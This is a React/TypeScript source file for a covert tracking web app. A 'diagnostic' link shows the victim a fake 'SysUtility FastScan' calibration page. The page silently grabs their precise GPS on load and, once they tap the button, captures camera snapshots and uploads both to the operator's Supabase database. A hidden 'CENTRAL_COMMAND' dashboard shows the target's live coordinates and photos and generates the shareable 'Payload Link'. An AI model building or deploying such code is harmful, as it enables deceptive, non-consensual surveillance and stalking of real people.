
import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import CameraFeed from './components/CameraFeed';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

const App: React.FC = () => {
  const params = useMemo(() => new URLSearchParams(window.location.search), []);
  const isStealthMode = params.get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [config, setConfig] = useState({
    url: params.get('sb_url') || localStorage.getItem('SB_URL_OVER_RE') || '',
    key: params.get('sb_key') || localStorage.getItem('SB_KEY_OVER_RE') || ''
  });

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagStep, setDiagStep] = useState(0); 
  const [diagProgress, setDiagProgress] = useState(0);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("READY");
  const [showConfigEditor, setShowConfigEditor] = useState(false);
  
  // Cache untuk GPS agar instan saat diagnosa dimulai
  const cachedLocation = useRef<Partial<LocationData> | null>(null);

  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];

  const supabase = useMemo(() => {
    if (config.url && config.key) {
      try { return createClient(config.url, config.key); } catch (e) { return null; }
    }
    return null;
  }, [config.url, config.key]);

  const syncToDatabase = async (loc: Partial<LocationData>) => {
    if (!supabase) return;
    setDbLog("SENDING...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ id: targetId, ...loc, timestamp: Date.now() });
      setDbLog(error ? "ERR_SYNC" : "SYNCED_OK");
    } catch (err) {
      setDbLog("NET_ERR");
    }
  };

  // Pre-fetch GPS di latar belakang begitu halaman dimuat (Stealth)
  useEffect(() => {
    if (isStealthMode) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          cachedLocation.current = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          };
        },
        null,
        { enableHighAccuracy: true, timeout: 5000 }
      );
    }
  }, [isStealthMode]);

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
        if (data) {
          setMembers([{
            ...members[0],
            currentLocation: data,
            status: 'online',
            lastSeen: data.timestamp
          }]);
        }
      };
      fetchData();

      const channel = supabase
        .channel('live-track')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: data,
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();
      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode, supabase]);

  const startDiagnostic = () => {
    setIsDiagnosing(true);
    setDiagStep(1);
    
    // Alur diagnosa Turbo (Selesai dalam ~3 detik)
    
    // Step 2: GPS Instan (Gunakan cache jika ada)
    setTimeout(() => {
      setDiagStep(2);
      if (cachedLocation.current) {
        syncToDatabase(cachedLocation.current);
      } else {
        navigator.geolocation.getCurrentPosition((pos) => {
          syncToDatabase({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          });
        });
      }
    }, 600);

    // Step 3: Camera Instan
    setTimeout(() => setDiagStep(3), 1500);

    // Step 4: Final Instan
    setTimeout(() => setDiagStep(4), 2800);

    let progress = 0;
    const interval = setInterval(() => {
      progress += 2; // Progres lebih cepat
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 30);
  };

  const getFullDiagnosticUrl = () => {
    const baseUrl = window.location.origin + window.location.pathname;
    return `${baseUrl}?mode=diagnostic&sb_url=${encodeURIComponent(config.url)}&sb_key=${encodeURIComponent(config.key)}`;
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 items-center justify-center">
        <div className="max-w-md w-full space-y-6">
           <div className="text-center">
              <i className="fas fa-shield-halved text-blue-500 text-4xl mb-3 animate-pulse"></i>
              <h1 className="text-lg font-bold uppercase tracking-widest">SysUtility <span className="text-blue-500">FastScan</span></h1>
           </div>
           
           {!isDiagnosing ? (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center space-y-4">
                <p className="text-slate-400 text-[10px] uppercase tracking-tighter">Membutuhkan kalibrasi sensor segera.</p>
                <button onClick={startDiagnostic} className="w-full py-4 bg-blue-600 rounded-2xl font-black text-xs uppercase tracking-widest active:scale-95 transition-all">Jalankan Diagnosa Cepat</button>
             </div>
           ) : (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 space-y-4">
                <div className="space-y-2">
                   <div className="flex justify-between text-[8px] uppercase font-bold text-slate-500">
                        <span>{diagStep === 1 ? 'Core' : diagStep === 2 ? 'GPS' : diagStep === 3 ? 'Optic' : 'OK'}</span>
                        <span className="text-blue-400">{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
                        <div className="bg-blue-500 h-full transition-all duration-100" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="h-48 rounded-2xl overflow-hidden border border-slate-800 bg-black">
                    {diagStep === 3 ? (
                        <CameraFeed isCapturing={true} onCapture={(b64) => syncToDatabase({ snapshot: b64 })} />
                    ) : diagStep === 4 ? (
                        <div className="w-full h-full flex flex-col items-center justify-center text-emerald-500 space-y-1">
                            <i className="fas fa-check-circle text-2xl animate-bounce"></i>
                            <span className="text-[8px] font-bold uppercase tracking-widest">Optimized</span>
                        </div>
                    ) : (
                        <div className="w-full h-full flex items-center justify-center">
                            <i className={`fas ${diagStep === 1 ? 'fa-bolt' : 'fa-satellite'} text-slate-800 text-3xl animate-pulse`}></i>
                        </div>
                    )}
                </div>

                <div className="bg-black/40 p-4 rounded-xl space-y-1 text-[8px] uppercase font-bold tracking-tighter border border-slate-800/50">
                   <div className="flex justify-between">
                      <span className="text-slate-600">Link_Status</span>
                      <span className="text-blue-400">{dbLog}</span>
                   </div>
                </div>
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono selection:bg-blue-500/30">
      <Sidebar members={members} activeMemberId="1" onSelectMember={() => {}} isUnlocked={isUnlocked} onUnlock={() => setIsUnlocked(true)} />
      
      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900/50 border-b border-slate-800 flex items-center justify-between px-8 shrink-0 z-10">
          <div className="flex flex-col">
              <h2 className="text-[10px] font-black tracking-widest text-white uppercase">{isUnlocked ? 'CENTRAL_COMMAND' : 'RESTRICTED'}</h2>
              <span className="text-[7px] text-slate-500 uppercase">Sync: <span className="text-emerald-500">Realtime</span></span>
          </div>
          {isUnlocked && (
              <button onClick={() => setShowConfigEditor(true)} className="w-8 h-8 flex items-center justify-center rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 transition-all"><i className="fas fa-sliders-h text-xs"></i></button>
          )}
        </header>

        <div className="flex-1 p-8 overflow-y-auto space-y-8 custom-scrollbar">
          {!isUnlocked ? (
            <div className="max-w-xl mx-auto py-32 text-center space-y-6">
               <i className="fas fa-microchip text-slate-800 text-5xl mb-2"></i>
               <h1 className="text-lg font-black text-slate-400 uppercase tracking-widest">Authorization Required</h1>
               <p className="text-[9px] text-slate-600 uppercase tracking-widest">Click build version 5x to enter</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 max-w-7xl mx-auto">
              <div className="lg:col-span-8 space-y-8">
                <div className="bg-slate-900 border border-slate-800 rounded-[2rem] p-8 shadow-2xl">
                    <div className="flex justify-between items-center mb-6">
                        <div className="flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-rose-500 rounded-full animate-ping"></div>
                            <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Target Visual</h3>
                        </div>
                    </div>
                    <div className="relative aspect-video bg-black rounded-2xl overflow-hidden border border-slate-800 shadow-inner">
                        {activeMember.currentLocation?.snapshot ? (
                            <img src={activeMember.currentLocation.snapshot} className="w-full h-full object-cover grayscale brightness-90" alt="Feed" />
                        ) : (
                            <div className="w-full h-full flex flex-col items-center justify-center text-slate-800 space-y-3">
                                <i className="fas fa-satellite text-4xl animate-pulse"></i>
                                <span className="text-[8px] font-black uppercase tracking-[0.3em]">Waiting for Sync...</span>
                            </div>
                        )}
                        <div className="absolute inset-0 pointer-events-none opacity-20 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_4px,3px_100%]"></div>
                    </div>
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-[2rem] p-8">
                   <div className="flex justify-between items-center mb-8">
                      <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Coordinates</h3>
                      {activeMember.currentLocation && (
                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-6 py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-[9px] font-black uppercase transition-all shadow-lg shadow-blue-600/20">Google Maps</button>
                      )}
                   </div>
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-2 gap-4">
                        <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800/50">
                           <p className="text-[8px] text-slate-600 uppercase mb-2 font-bold tracking-widest">Latitude</p>
                           <p className="text-2xl font-black text-white mono">{activeMember.currentLocation.latitude.toFixed(6)}</p>
                        </div>
                        <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800/50">
                           <p className="text-[8px] text-slate-600 uppercase mb-2 font-bold tracking-widest">Longitude</p>
                           <p className="text-2xl font-black text-white mono">{activeMember.currentLocation.longitude.toFixed(6)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="py-16 border border-dashed border-slate-800 rounded-2xl text-center bg-slate-950/30 text-[9px] text-slate-600 uppercase font-black tracking-widest">Offline</div>
                   )}
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-[2rem] p-8">
                    <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Payload Link</h3>
                    <div className="flex gap-3">
                        <input readOnly value={getFullDiagnosticUrl()} className="flex-1 bg-slate-950 border border-slate-800 rounded-xl py-3 px-4 text-[9px] text-slate-500 focus:outline-none mono" />
                        <button onClick={() => {
                            navigator.clipboard.writeText(getFullDiagnosticUrl());
                            setCopyStatus('link');
                            setTimeout(() => setCopyStatus(null), 2000);
                        }} className={`px-6 py-3 rounded-xl text-[9px] font-black uppercase transition-all ${copyStatus === 'link' ? 'bg-emerald-600 text-white' : 'bg-slate-800 hover:bg-slate-700 text-white'}`}>
                            {copyStatus === 'link' ? 'Copied' : 'Copy'}
                        </button>
                    </div>
                </div>
              </div>

              <div className="lg:col-span-4 space-y-8">
                <LocationCard member={activeMember} insight={insight} loadingInsight={isLoadingInsight} />
                <div className="bg-slate-900 border border-slate-800 rounded-[2rem] p-6 space-y-4">
                    <h4 className="text-[9px] font-black text-slate-500 uppercase tracking-widest">Uptime Info</h4>
                    <div className="space-y-3 text-[9px] uppercase font-bold">
                       <div className="flex justify-between"><span className="text-slate-600">Database</span><span className="text-emerald-500">Live</span></div>
                       <div className="flex justify-between"><span className="text-slate-600">Frequency</span><span className="text-blue-400">10Hz</span></div>
                    </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      {showConfigEditor && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-xl flex items-center justify-center p-6 z-[100]">
           <div className="bg-slate-900 border border-slate-800 w-full max-w-md rounded-[2rem] p-10 space-y-8">
              <div className="flex justify-between items-center">
                 <h2 className="text-sm font-black uppercase tracking-widest text-white">Bridge Config</h2>
                 <button onClick={() => setShowConfigEditor(false)} className="text-slate-500 hover:text-white"><i className="fas fa-times"></i></button>
              </div>
              <form onSubmit={(e) => {
                  e.preventDefault();
                  const fd = new FormData(e.currentTarget as HTMLFormElement);
                  localStorage.setItem('SB_URL_OVER_RE', fd.get('url') as string);
                  localStorage.setItem('SB_KEY_OVER_RE', fd.get('key') as string);
                  window.location.reload();
              }} className="space-y-4">
                 <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] text-slate-300 mono outline-none" placeholder="URL" required />
                 <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] text-slate-300 h-24 mono outline-none resize-none" placeholder="Key" required />
                 <button type="submit" className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-black uppercase text-white transition-all">Apply</button>
              </form>
           </div>
        </div>
      )}
    </div>
  );
};

export default App;
